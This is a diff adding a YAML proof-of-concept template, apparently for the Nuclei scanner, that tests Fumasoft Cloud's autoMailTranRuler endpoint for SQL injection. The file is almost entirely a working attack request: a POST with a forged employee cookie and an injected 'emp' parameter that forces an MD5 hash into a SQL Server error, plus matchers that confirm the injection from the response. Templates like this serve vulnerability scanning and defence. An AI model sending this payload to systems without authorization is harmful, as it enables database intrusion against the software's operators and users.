@@ -1,0 +1,32 @@
+id: poc-yaml-fumasoft-automailtranruler-sqli
+info:
+  name: 孚盟云 autoMailTranRuler SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "/m/Dingding/Ajax/AjaxMailInSend.ashx"
+    headers:
+      Cookie: "UserCookie={\"empId\":\"1\"}"
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "action=autoMailTranRuler&emp=1)/**/and/**/+(sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))=1&fid=&mid=&auotTrans=false&transFlag=false&noticeFlag=false&memo="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "select EmpID"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
